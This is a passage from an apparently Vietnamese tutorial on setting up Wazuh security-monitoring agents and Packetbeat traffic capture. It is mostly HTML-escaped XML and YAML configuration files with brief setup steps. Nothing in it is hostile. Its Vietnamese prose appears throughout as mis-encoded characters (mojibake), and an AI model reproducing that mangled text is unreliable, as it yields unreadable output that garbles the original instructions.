\u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\Teredo\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\PolicyAgent\\Parameters\\Cache\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\ADOVMPPackage\\Final\u0026lt;/registry_ignore\u0026gt; \u0026lt;!-- Frequency for ACL checking (seconds) --\u0026gt; \u0026lt;windows_audit_interval\u0026gt;60\u0026lt;/windows_audit_interval\u0026gt; \u0026lt;!-- Nice value for Syscheck module --\u0026gt; \u0026lt;process_priority\u0026gt;10\u0026lt;/process_priority\u0026gt; \u0026lt;!-- Maximum output throughput --\u0026gt; \u0026lt;max_eps\u0026gt;100\u0026lt;/max_eps\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;interval\u0026gt;5m\u0026lt;/interval\u0026gt; \u0026lt;max_interval\u0026gt;1h\u0026lt;/max_interval\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/syscheck\u0026gt; \u0026lt;!-- System inventory --\u0026gt; \u0026lt;wodle name=\u0026#34;syscollector\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;interval\u0026gt;1h\u0026lt;/interval\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;hardware\u0026gt;yes\u0026lt;/hardware\u0026gt; \u0026lt;os\u0026gt;yes\u0026lt;/os\u0026gt; \u0026lt;network\u0026gt;yes\u0026lt;/network\u0026gt; \u0026lt;packages\u0026gt;yes\u0026lt;/packages\u0026gt; \u0026lt;ports all=\u0026#34;no\u0026#34;\u0026gt;yes\u0026lt;/ports\u0026gt; \u0026lt;processes\u0026gt;yes\u0026lt;/processes\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- CIS policies evaluation --\u0026gt; \u0026lt;wodle name=\u0026#34;cis-cat\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;timeout\u0026gt;1800\u0026lt;/timeout\u0026gt; \u0026lt;interval\u0026gt;1d\u0026lt;/interval\u0026gt; \u0026lt;scan-on-start\u0026gt;yes\u0026lt;/scan-on-start\u0026gt; \u0026lt;java_path\u0026gt;\\\\server\\jre\\bin\\java.exe\u0026lt;/java_path\u0026gt; \u0026lt;ciscat_path\u0026gt;C:\\cis-cat\u0026lt;/ciscat_path\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- Osquery integration --\u0026gt; \u0026lt;wodle name=\u0026#34;osquery\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;run_daemon\u0026gt;yes\u0026lt;/run_daemon\u0026gt; \u0026lt;bin_path\u0026gt;C:\\Program Files\\osquery\\osqueryd\u0026lt;/bin_path\u0026gt; \u0026lt;log_path\u0026gt;C:\\Program Files\\osquery\\log\\osqueryd.results.log\u0026lt;/log_path\u0026gt; \u0026lt;config_path\u0026gt;C:\\Program Files\\osquery\\osquery.conf\u0026lt;/config_path\u0026gt; \u0026lt;add_labels\u0026gt;yes\u0026lt;/add_labels\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- Active response --\u0026gt; \u0026lt;active-response\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;ca_store\u0026gt;wpk_root.pem\u0026lt;/ca_store\u0026gt; \u0026lt;ca_verification\u0026gt;yes\u0026lt;/ca_verification\u0026gt; \u0026lt;/active-response\u0026gt; \u0026lt;!-- Choose between plain or json format (or both) for internal logs --\u0026gt; \u0026lt;logging\u0026gt; \u0026lt;log_format\u0026gt;plain\u0026lt;/log_format\u0026gt; \u0026lt;/logging\u0026gt; \u0026lt;/ossec_config\u0026gt; \u0026lt;!-- END of Default Configuration. --\u0026gt; LÆ°u file láº¡i. Sau Ä‘Ã³ cháº¡y win32ui.exe vá»›i quyá»n admin. Chá»n Manage -\u0026gt; Restart. Chá» 1 lÃºc Ä‘á»ƒ há»‡ thá»‘ng táº¡o káº¿t ná»‘i vÃ  vÃ o Manager Ä‘á»ƒ kiá»ƒm tra láº¡i.\nLinux OS # Packetbeat # Packetbeat lÃ  má»™t cÃ´ng cá»¥ phÃ¢n tÃ­ch lÆ°u lÆ°á»£ng máº¡ng vÃ  hiá»‡u nÄƒng há»‡ thá»‘ng. NÃ³ hoáº¡t Ä‘á»™ng báº±ng cÃ¡ch chá»¥p láº¡i cÃ¡c traffic máº¡ng giá»¯a cÃ¡c á»©ng dá»¥ng, dá»‹ch vá»¥, vÃ  táº¥t nhiÃªn lÃ  cáº£ nhá»¯ng traffic ra vÃ  vÃ o internet.\nVÃ­ dá»¥ tÃ´i Ä‘ang cÃ³ mÃ¡y Ubuntu 22.04 vÃ  muá»‘n cÃ i agent lÃªn Ä‘Ã¢y thÃ¬ tÃ´i sáº½ cÃ i Packetbeat báº±ng apt.\nTuy nhiÃªn tÃ´i sáº½ thay Ä‘á»•i cáº¥u hÃ¬nh cá»§a Packetbeat má»™t chÃºt theo má»¥c Ä‘Ã­ch cá»§a tÃ´i. TÃ´i sáº½ thay Ä‘á»•i output cá»§a Packetbeat Ä‘á»ƒ manager cÃ³ thá»ƒ láº¥y log cá»§a nÃ³ dá»… dÃ ng hÆ¡n\n#################### Packetbeat Configuration Example ######################### # This file is an example configuration file highlighting only the most common # options. The packetbeat.reference.yml file from the same directory contains all the # supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/packetbeat/index.html # =============================== Network device =============================== # Select the network interface to sniff the data. On Linux, you can use the # \u0026#34;any\u0026#34; keyword to sniff on all connected interfaces. packetbeat.interfaces.device: any # The network CIDR blocks that are considered \u0026#34;internal\u0026#34; networks for # the purpose of network perimeter boundary classification. The valid # values for internal_networks are the same as those that can be used # with processor network conditions. # # For a list of available values see: # https://www.elastic.co/guide/en/beats/packetbeat/current/defining-processors.html#condition-network packetbeat.interfaces.internal_networks: - private # =================================== Flows ==================================== # Set `enabled: false` or comment out all options to disable flows reporting. packetbeat.flows: # Set network flow timeout. Flow is killed if no packet is received before being # timed out. timeout: 30s # Configure reporting period. If set to -1, only killed flows will be reported period: 10s # =========================== Transaction protocols ============================ packetbeat.protocols: - type: icmp # Enable ICMPv4 and ICMPv6 monitoring. The default is true. enabled: true - type: amqp # Configure the ports where to listen for AMQP traffic. You can disable # the AMQP protocol by commenting out the list of ports. ports: [5672] - type: cassandra # Configure the ports where to listen for Cassandra traffic. You can disable # the Cassandra protocol by commenting out the list of ports. ports: [9042] - type: dhcpv4 # Configure the DHCP for IPv4 ports. ports: [67, 68] - type: dns # Configure the ports where to listen for DNS traffic. You can disable # the DNS protocol by commenting out the list of ports. ports: [53] - type: http # Configure the ports where to listen for HTTP traffic. You can disable # the HTTP protocol by commenting out the list of ports. ports: [80, 8080, 8000, 5000, 8002] - type: memcache # Configure the ports where to listen for memcache traffic. You can disable # the Memcache protocol by commenting out the list of ports. ports: [11211] - type: mysql # Configure the ports where to listen for MySQL traffic. You can disable # the MySQL protocol by commenting out the list of ports. ports: [3306,3307] - type: pgsql # Configure the ports where to listen for Pgsql traffic. You can disable # the Pgsql protocol by commenting out the list of ports. ports: [5432] - type: redis # Configure the ports where to listen for Redis traffic. You can disable # the Redis protocol by commenting out the list of ports. ports: [6379] - type: thrift # Configure the ports where to listen for Thrift-RPC traffic. You can disable # the Thrift-RPC protocol by commenting out the list of ports. ports: [9090] - type: mongodb # Configure the ports where to listen for MongoDB traffic. You can disable # the MongoDB protocol by commenting out the list of ports. ports: [27017] - type: nfs # Configure the ports where to listen for NFS traffic. You can disable # the NFS protocol by commenting out the list of ports. ports: [2049] - type: tls # Configure the ports where to listen for TLS traffic. You can disable # the TLS protocol by commenting out the list of ports. ports: - 443 # HTTPS - 993 # IMAPS - 995 # POP3S - 5223 # XMPP over SSL - 8443 - 8883 # Secure MQTT - 9243 # Elasticsearch - type: sip # Configure the ports where to listen for SIP traffic. You can disable # the SIP protocol by commenting out the list of ports. ports: [5060] # ======================= Elasticsearch template setting ======================= setup.template.settings: index.number_of_shards: 1 #index.codec: best_compression #_source.enabled: false # ================================== General =================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # A list of tags to include in every event. In the default configuration file # the forwarded tag causes Packetbeat to not add any host fields. If you are # monitoring a network tap or mirror port then add the forwarded tag. #tags: [forwarded] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging # ================================= Dashboards ================================= # These settings control loading the sample dashboards to the Kibana index. Loading # the dashboards is disabled by default and can be enabled either by setting the # options here or by using the `setup` command. #setup.dashboards.enabled: false # The URL from where to download the dashboards archive. By default this URL # has a value which is computed based on the Beat name and version. For released # versions, this URL points to the dashboard archive on the artifacts.elastic.co # website. #setup.dashboards.url: # =================================== Kibana =================================== # Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API. # This requires a Kibana endpoint configuration. setup.kibana: # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 #host: \u0026#34;localhost:5601\u0026#34; # Kibana Space ID # ID of the Kibana Space into which the dashboards should be loaded. By default, # the Default Space will be used. #space.id: # =============================== Elastic Cloud ================================ # These settings simplify using Packetbeat with the Elastic Cloud (https://cloud.elastic.co/). # The cloud.id setting overwrites the `output.elasticsearch.hosts` and # `setup.kibana.host` options. # You can find the `cloud.id` in the Elastic Cloud web UI. #cloud.id: # The cloud.auth setting overwrites the `output.elasticsearch.username` and # `output.elasticsearch.password` settings. The format is `\u0026lt;user\u0026gt;:\u0026lt;pass\u0026gt;`. #cloud.auth: # ================================== Outputs =================================== # Configure what output to use when sending the data collected by the beat. # ---------------------------- Elasticsearch Output ---------------------------- #output.elasticsearch: # Array of hosts to connect to. # hosts: [\u0026#34;localhost:9200\u0026#34;] # Protocol - either `http` (default) or `https`. #protocol: \u0026#34;https\u0026#34; # Authentication credentials - either API key or username/password. #api_key: \u0026#34;id:api_key\u0026#34; #username: \u0026#34;elastic\u0026#34; #password: \u0026#34;changeme\u0026#34; output.file: path: \u0026#34;/tmp/packetbeat\u0026#34; filename: packetbeat # ------------------------------ Logstash Output ------------------------------- #output.logstash: # The Logstash hosts #hosts: [\u0026#34;localhost:5044\u0026#34;] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\u0026#34;/etc/pki/root/ca.pem\u0026#34;] # Certificate for SSL client authentication #ssl.certificate: \u0026#34;/etc/pki/client/cert.pem\u0026#34; # Client Certificate Key #ssl.key: \u0026#34;/etc/pki/client/cert.key\u0026#34; # ================================= Processors ================================= processors: - # Add forwarded to tags when processing data from a network tap or mirror. if.contains.tags: forwarded then: - drop_fields: fields: [host] else: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - detect_mime_type: field: http.request.body.content target: http.request.mime_type - detect_mime_type: field: http.response.body.content target: http.response.mime_type # ================================== Logging =================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\u0026#34;*\u0026#34;]. Examples of other selectors are \u0026#34;beat\u0026#34;, # \u0026#34;publisher\u0026#34;, \u0026#34;service\u0026#34;. #logging.selectors: [\u0026#34;*\u0026#34;] # ============================= X-Pack Monitoring ============================== # Packetbeat can export internal metrics to a central Elasticsearch monitoring # cluster. This requires xpack monitoring to be enabled in Elasticsearch. The # reporting is disabled by default. # Set to true to enable the monitoring reporter. #monitoring.enabled: false # Sets the UUID of the Elasticsearch cluster under which monitoring data for this # Packetbeat instance will appear in the Stack Monitoring UI. If output.elasticsearch # is enabled, the UUID is derived from the Elasticsearch cluster referenced by output.elasticsearch. #monitoring.cluster_uuid: # Uncomment to send the metrics to Elasticsearch. Most settings from the # Elasticsearch output are accepted here as well. # Note that the settings should point to your Elasticsearch *monitoring* cluster. # Any setting that is not set is automatically inherited from the Elasticsearch # output configuration, so if you have the Elasticsearch output configured such # that it is pointing to your Elasticsearch monitoring cluster, you can simply # uncomment the following line. #monitoring.elasticsearch: # ============================== Instrumentation =============================== # Instrumentation support for the packetbeat. #instrumentation: # Set to true to enable instrumentation of packetbeat. #enabled: false # Environment in which packetbeat is running on (eg: staging, production, etc.) #environment: \u0026#34;\u0026#34; # APM Server hosts to report instrumentation results to. #hosts: # - http://localhost:8200 # API Key for the APM Server(s). # If api_key is set then secret_token will be ignored. #api_key: # Secret token for the APM Server(s). #secret_token: # ================================= Migration ================================== # This allows to enable 6.7 migration aliases #migration.6_to_7.enabled: true LÆ°u láº¡i file vÃ  khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥\nsystemctl restart packetbeat CÃ i Ä‘áº·t Wazuh-agent cho linux # NhÆ° Ä‘Ã£ táº¡o group OS-LINUX cho manager á»Ÿ trÃªn nÃªn bÃ¢y giá» tÃ´i chá»‰ cáº§n thay Ä‘á»•i cáº¥u hÃ¬nh cá»§a group nÃ y\n\u0026lt;agent_config\u0026gt; \u0026lt;client_buffer\u0026gt; \u0026lt;!-- Agent buffer options --\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;queue_size\u0026gt;5000\u0026lt;/queue_size\u0026gt; \u0026lt;events_per_second\u0026gt;500\u0026lt;/events_per_second\u0026gt; \u0026lt;/client_buffer\u0026gt; \u0026lt;!-- Policy monitoring --\u0026gt; \u0026lt;rootcheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;!-- Frequency that rootcheck is executed - every 12 hours --\u0026gt; \u0026lt;frequency\u0026gt;43200\u0026lt;/frequency\u0026gt; \u0026lt;rootkit_files\u0026gt;/var/ossec/etc/shared/rootkit_files.txt\u0026lt;/rootkit_files\u0026gt; \u0026lt;rootkit_trojans\u0026gt;/var/ossec/etc/shared/rootkit_trojans.txt\u0026lt;/rootkit_trojans\u0026gt; \u0026lt;system_audit\u0026gt;/var/ossec/etc/shared/system_audit_rcl.txt\u0026lt;/system_audit\u0026gt; \u0026lt;system_audit\u0026gt;/var/ossec/etc/shared/system_audit_ssh.txt\u0026lt;/system_audit\u0026gt; \u0026lt;system_audit\u0026gt;/var/ossec/etc/shared/cis_debian_linux_rcl.txt\u0026lt;/system_audit\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;/rootcheck\u0026gt; \u0026lt;wodle name=\u0026#34;open-scap\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;timeout\u0026gt;1800\u0026lt;/timeout\u0026gt; \u0026lt;interval\u0026gt;1d\u0026lt;/interval\u0026gt; \u0026lt;scan-on-start\u0026gt;yes\u0026lt;/scan-on-start\u0026gt; \u0026lt;content type=\u0026#34;xccdf\u0026#34; path=\u0026#34;ssg-debian-8-ds.xml\u0026#34;\u0026gt; \u0026lt;profile\u0026gt;xccdf_org.ssgproject.content_profile_common\u0026lt;/profile\u0026gt; \u0026lt;/content\u0026gt; \u0026lt;content type=\u0026#34;oval\u0026#34; path=\u0026#34;cve-debian-oval.xml\u0026#34;/\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- File integrity monitoring --\u0026gt; \u0026lt;syscheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;!-- Frequency that syscheck is executed default every 12 hours --\u0026gt; \u0026lt;frequency\u0026gt;43200\u0026lt;/frequency\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;!-- Directories to check (perform all possible verifications) --\u0026gt; \u0026lt;directories\u0026gt;/etc,/usr/bin,/usr/sbin\u0026lt;/directories\u0026gt; \u0026lt;directories\u0026gt;/bin,/sbin,/boot\u0026lt;/directories\u0026gt; \u0026lt;!-- Files/directories to ignore --\u0026gt; \u0026lt;ignore\u0026gt;/etc/mtab\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/hosts.deny\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/mail/statistics\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/random-seed\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/random.seed\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/adjtime\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/httpd/logs\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/utmpx\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/wtmpx\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/cups/certs\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/dumpdates\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/etc/svc/volatile\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/sys/kernel/security\u0026lt;/ignore\u0026gt; \u0026lt;ignore\u0026gt;/sys/kernel/debug\u0026lt;/ignore\u0026gt; \u0026lt;!-- File types to ignore --\u0026gt; \u0026lt;ignore type=\u0026#34;sregex\u0026#34;\u0026gt;.log$|.swp$\u0026lt;/ignore\u0026gt; \u0026lt;!-- Check the file, but never compute the diff --\u0026gt; \u0026lt;nodiff\u0026gt;/etc/ssl/private.key\u0026lt;/nodiff\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;skip_dev\u0026gt;yes\u0026lt;/skip_dev\u0026gt; \u0026lt;skip_proc\u0026gt;yes\u0026lt;/skip_proc\u0026gt; \u0026lt;skip_sys\u0026gt;yes\u0026lt;/skip_sys\u0026gt; \u0026lt;!-- Nice value for Syscheck process --\u0026gt; \u0026lt;process_priority\u0026gt;10\u0026lt;/process_priority\u0026gt; \u0026lt;!-- Maximum output throughput --\u0026gt; \u0026lt;max_eps\u0026gt;100\u0026lt;/max_eps\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;interval\u0026gt;5m\u0026lt;/interval\u0026gt; \u0026lt;response_timeout\u0026gt;30\u0026lt;/response_timeout\u0026gt; \u0026lt;queue_size\u0026gt;16384\u0026lt;/queue_size\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/syscheck\u0026gt; \u0026lt;!-- Log analysis --\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;json\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/tmp/packetbeat/packetbeat*\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/ossec/logs/active-responses.log\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/messages\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/auth.log\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/var/log/syslog\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;command\u0026lt;/log_format\u0026gt; \u0026lt;command\u0026gt;df -P\u0026lt;/command\u0026gt; \u0026lt;frequency\u0026gt;360\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;full_command\u0026lt;/log_format\u0026gt; \u0026lt;command\u0026gt;netstat -tan |grep LISTEN |grep -v 127.0.0.1 | sort\u0026lt;/command\u0026gt; \u0026lt;frequency\u0026gt;360\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;full_command\u0026lt;/log_format\u0026gt; \u0026lt;command\u0026gt;last -n 5\u0026lt;/command\u0026gt; \u0026lt;frequency\u0026gt;360\u0026lt;/frequency\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;wodle name=\u0026#34;osquery\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;run_daemon\u0026gt;yes\u0026lt;/run_daemon\u0026gt; \u0026lt;log_path\u0026gt;/var/log/osquery/osqueryd.results.log\u0026lt;/log_path\u0026gt; \u0026lt;config_path\u0026gt;/etc/osquery/osquery.conf\u0026lt;/config_path\u0026gt; \u0026lt;add_labels\u0026gt;yes\u0026lt;/add_labels\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;wodle name=\u0026#34;syscollector\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;interval\u0026gt;24h\u0026lt;/interval\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;packages\u0026gt;yes\u0026lt;/packages\u0026gt; \u0026lt;os\u0026gt;yes\u0026lt;/os\u0026gt; \u0026lt;hotfixes\u0026gt;yes\u0026lt;/hotfixes\u0026gt; \u0026lt;ports all=\u0026#34;no\u0026#34;\u0026gt;yes\u0026lt;/ports\u0026gt; \u0026lt;processes\u0026gt;yes\u0026lt;/processes\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;/agent_config\u0026gt; Kiá»ƒm tra láº¡i file cáº¥u hÃ¬nh á»Ÿ trÃªn, náº¿u cÃ³ pháº§n\n\u0026lt;localfile\u0026gt; \u0026lt;log_format\u0026gt;json\u0026lt;/log_format\u0026gt; \u0026lt;location\u0026gt;/tmp/packetbeat/packetbeat*\u0026lt;/location\u0026gt; \u0026lt;/localfile\u0026gt; thÃ¬ manager má»›i nháº­n Ä‘Æ°á»£c log tá»« Packetbeat\nTiáº¿p theo tÃ´i sáº½ cÃ i Ä‘áº·t Wazuh-agent cho Linux theo hÆ°á»›ng dáº«n cá»§a Wazuh. Tuy nhiÃªn tÃ´i sáº½ sá»­a cáº¥u hÃ¬nh cá»§a agent theo má»¥c Ä‘Ã­ch cá»§a mÃ¬nh.\nÄáº§u tiÃªn tÃ´i xÃ³a file config máº·c Ä‘á»‹nh\nrm -rf /var/ossec/etc/ossec.conf Táº¡o file config má»›i vÃ  thÃªm cáº¥u hÃ¬nh. Thay pháº§n address báº±ng IP cá»§a manager\nnano /var/ossec/etc/ossec.conf \u0026lt;!-- Wazuh - Agent - Default configuration for rhel 7.9 More info at: https://documentation.wazuh.com Mailing list: https://groups.google.com/forum/#!forum/wazuh --\u0026gt; \u0026lt;ossec_config\u0026gt; \u0026lt;client\u0026gt; \u0026lt;server\u0026gt; \u0026lt;address\u0026gt;10.10.24.1\u0026lt;/address\u0026gt; \u0026lt;port\u0026gt;1514\u0026lt;/port\u0026gt; \u0026lt;protocol\u0026gt;tcp\u0026lt;/protocol\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;config-profile\u0026gt;linux\u0026lt;/config-profile\u0026gt; \u0026lt;notify_time\u0026gt;10\u0026lt;/notify_time\u0026gt; \u0026lt;time-reconnect\u0026gt;60\u0026lt;/time-reconnect\u0026gt; \u0026lt;auto_restart\u0026gt;yes\u0026lt;/auto_restart\u0026gt; \u0026lt;crypto_method\u0026gt;aes\u0026lt;/crypto_method\u0026gt; \u0026lt;notify_time\u0026gt;10\u0026lt;/notify_time\u0026gt; \u0026lt;time-reconnect\u0026gt;60\u0026lt;/time-reconnect\u0026gt; \u0026lt;auto_restart\u0026gt;yes\u0026lt;/auto_restart\u0026gt; \u0026lt;enrollment\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;manager_address\u0026gt;10.10.24.1\u0026lt;/manager_address\u0026gt; \u0026lt;groups\u0026gt;OS-LINUX\u0026lt;/groups\u0026gt; \u0026lt;/enrollment\u0026gt; \u0026lt;/client\u0026gt; \u0026lt;client_buffer\u0026gt; \u0026lt;!-- Agent buffer options --\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;queue_size\u0026gt;5000\u0026lt;/queue_size\u0026gt; \u0026lt;events_per_second\u0026gt;500\u0026lt;/events_per_second\u0026gt; \u0026lt;/client_buffer\u0026gt; \u0026lt;!-- Policy monitoring --\u0026gt; \u0026lt;rootcheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;check_files\u0026gt;yes\u0026lt;/check_files\u0026gt; \u0026lt;check_trojans\u0026gt;yes\u0026lt;/check_trojans\u0026gt; \u0026lt;check_dev\u0026gt;yes\u0026lt;/check_dev\u0026gt; \u0026lt;check_sys\u0026gt;yes\u0026lt;/check_sys\u0026gt; \u0026lt;check_pids\u0026gt;yes\u0026lt;/check_pids\u0026gt; \u0026lt;check_ports\u0026gt;yes\u0026lt;/check_ports\u0026gt; \u0026lt;check_if\u0026gt;yes\u0026lt;/check_if\u0026gt; \u0026lt;!-- Frequency that rootcheck is executed - every 12 hours --\u0026gt; \u0026lt;frequency\u0026gt;43200\u0026lt;/frequency\u0026gt; \u0026lt;rootkit_files\u0026gt;etc/shared/rootkit_files.txt\u0026lt;/rootkit_files\u0026gt; \u0026lt;rootkit_trojans\u0026gt;etc/shared/rootkit_trojans.txt\u0026lt;/rootkit_trojans\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;/rootcheck\u0026gt; \u0026lt;wodle name=\u0026#34;cis-cat\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;timeout\u0026gt;1800\u0026lt;/timeout\u0026gt; \u0026lt;interval\u0026gt;1d\u0026lt;/interval\u0026gt; \u0026lt;scan-on-start\u0026gt;yes\u0026lt;/scan-on-start\u0026gt; \u0026lt;java_path\u0026gt;wodles/java\u0026lt;/java_path\u0026gt; \u0026lt;ciscat_path\u0026gt;wodles/ciscat\u0026lt;/ciscat_path\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- Osquery integration --\u0026gt; \u0026lt;wodle name=\u0026#34;osquery\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;run_daemon\u0026gt;yes\u0026lt;/run_daemon\u0026gt; \u0026lt;log_path\u0026gt;/var/log/osquery/osqueryd.results.log\u0026lt;/log_path\u0026gt; \u0026lt;config_path\u0026gt;/etc/osquery/osquery.conf\u0026lt;/config_path\u0026gt; \u0026lt;add_labels\u0026gt;yes\u0026lt;/add_labels\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- System inventory --\u0026gt; \u0026lt;wodle name=\u0026#34;syscollector\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;interval\u0026gt;1h\u0026lt;/interval\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;hardware\u0026gt;yes\u0026lt;/hardware\u0026gt; \u0026lt;os\u0026gt;yes\u0026lt;/os\u0026gt; \u0026lt;network\u0026gt;yes\u0026lt;/network\u0026gt; \u0026lt;packages\u0026gt;yes\u0026lt;/packages\u0026gt; \u0026lt;ports all=\u0026#34;no\u0026#34;\u0026gt;yes\u0026lt;/ports\u0026gt; \u0026lt;processes\u0026gt;yes\u0026lt;/processes\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;sca\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;interval\u0026gt;12h\u0026lt;/interval\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;/sca\u0026gt; \u0026lt;!-- File integrity monitoring --\u0026gt; 